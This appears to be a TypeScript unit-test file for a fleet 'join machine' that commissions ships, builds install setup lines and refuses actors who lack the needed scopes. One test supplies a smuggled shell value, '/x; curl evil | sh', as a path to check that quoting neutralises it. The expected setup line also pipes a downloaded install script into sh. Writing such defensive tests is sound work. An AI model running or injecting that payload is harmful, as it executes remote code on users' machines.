import { beforeEach, describe, expect, it } from 'vitest';

import { COMMISSIONED_SHIP_ID, FLEET_ID, FLEET_URL, SHIP_ID, fakePluginFleet, memoryConnectionStore } from '../../../test/support/connection-fakes.js';
import { createJoinMachine, type JoinMachine } from './join-machine.js';

const AT = new Date('2026-10-06T22:00:00.000Z');

let fleet: ReturnType<typeof fakePluginFleet>;
let connections: ReturnType<typeof memoryConnectionStore>;
let keys: number;

beforeEach(async () => {
  fleet = fakePluginFleet();
  connections = memoryConnectionStore();
  keys = 0;
  fleet.state.liveTokens.add('aeolus_ct_v1_plugin');
  await connections.save({ fleetId: FLEET_ID, shipId: SHIP_ID, name: 'trierarch-plugin', crewToken: 'aeolus_ct_v1_plugin', crewedAt: AT });
});

/** argo, as its console session answers it: core's scopes only, a plugin's not among them. */
const ARGO = { kind: 'operator', scopes: ['fleet:read', 'fleet:commission', 'fleet:manage'] } as const;

const joinWith = (input: { name?: string; actor?: Parameters<JoinMachine>[0]['actor']; options?: Parameters<JoinMachine>[0]['options'] }) =>
  createJoinMachine({
    door: fleet.door,
    connections,
    keys: {
      next: () => {
        keys += 1;
        return `join-${String(keys)}`;
      },
    },
    fleetUrl: FLEET_URL,
  })({ fleetId: FLEET_ID, name: input.name ?? 'mac-studio', actor: input.actor ?? ARGO, options: input.options });

const join = (name = 'mac-studio', actor: Parameters<JoinMachine>[0]['actor'] = ARGO) => joinWith({ name, actor });

describe('a machine joining', () => {
  it('commissions a ship of type trierarch with exactly crew:run beside send and receive, named as the operator asked', async () => {
    await join();

    expect(fleet.state.commissioned).toEqual([{ name: 'mac-studio', type: 'trierarch', scopes: ['crew:run'], idempotencyKey: 'join-1' }]);
  });

  it("answers its starting prompt as the fleet issued it, and a setup line for the machine built from its fields, naming the trierarch plugin's ship the trusted repositories come from", async () => {
    const secret = 'aeolus_sk_v1_machine';

    await expect(join()).resolves.toEqual({
      isOk: true,
      value: {
        shipId: COMMISSIONED_SHIP_ID,
        name: 'mac-studio',
        prompt: `You crew the Aeolus ship mac-studio. Register with ship id ${COMMISSIONED_SHIP_ID} and secret ${secret}.`,
        crewLines: [{ harness: 'claude-code', line: `/aeolus:crew ${FLEET_URL} ${COMMISSIONED_SHIP_ID} ${secret}` }],
        secret,
        setupLine: `curl -fsSL https://raw.githubusercontent.com/ThomasHendrickx/aeolus-fleet-trierarch/main/install.sh | sh -s -- --fleet-url ${FLEET_URL} --ship-id ${COMMISSIONED_SHIP_ID} --plugin-ship-id ${SHIP_ID} --secret ${secret}`,
      },
    });
  });

  it('builds the whole setup line from the harness and repository options, so the machine asks for nothing', async () => {
    const joined = await joinWith({
      options: { harnesses: ['claude-code', 'codex'], unattended: ['claude-code'], repositories: { kind: 'list', entries: ['~/code/web', '', "/srv/it's"] } },
    });

    expect(joined.isOk && joined.value.setupLine.endsWith(" --secret aeolus_sk_v1_machine --harnesses claude-code,codex --unattended claude-code --repositories '~/code/web,/srv/it'\\''s'")).toBe(true);
  });

  it('keeps a hostile value inside one quoted word at the end of the line', async () => {
    const joined = await joinWith({ options: { repositories: { kind: 'folder', path: '/x; curl evil | sh' } } });

    expect(joined.isOk && joined.value.setupLine.endsWith(" --repositories-in '/x; curl evil | sh'")).toBe(true);
  });

  it('commissions each join under a new idempotency key', async () => {
    await join('mac-studio');
    await join('linux-box');

    expect(fleet.state.commissioned.map((ship) => ship.idempotencyKey)).toEqual(['join-1', 'join-2']);
  });

  it('lets argo join a machine though its scopes list no plugin scope', async () => {
    await expect(join('mac-studio', ARGO)).resolves.toMatchObject({ isOk: true });
  });

  it('lets an actor holding trierarch:join join a machine', async () => {
    await expect(join('mac-studio', { kind: 'viewer', scopes: ['fleet:read', 'trierarch:join'] })).resolves.toMatchObject({ isOk: true });
  });

  it('is refused for an actor without trierarch:join, and commissions nothing', async () => {
    await expect(join('mac-studio', { kind: 'viewer', scopes: ['fleet:read', 'fleet:manage'] })).resolves.toMatchObject({
      isOk: false,
      error: { kind: 'NEEDS_SCOPE', message: 'Adding a computer needs trierarch:join' },
    });
    expect(fleet.state.commissioned).toEqual([]);
  });

  it('is refused while the trierarch plugin is not connected to the fleet, and commissions nothing', async () => {
    await connections.drop(FLEET_ID);

    await expect(join()).resolves.toMatchObject({ isOk: false, error: { kind: 'NOT_CONNECTED' } });
    expect(fleet.state.commissioned).toEqual([]);
  });

  it('is refused for a name an active ship holds', async () => {
    await join('mac-studio');

    await expect(join('mac-studio')).resolves.toMatchObject({ isOk: false, error: { kind: 'NAME_TAKEN' } });
  });

  it('is refused while the fleet does not answer', async () => {
    fleet.state.isAnswering = false;

    await expect(join()).resolves.toMatchObject({ isOk: false, error: { kind: 'FLEET_UNAVAILABLE' } });
  });
});
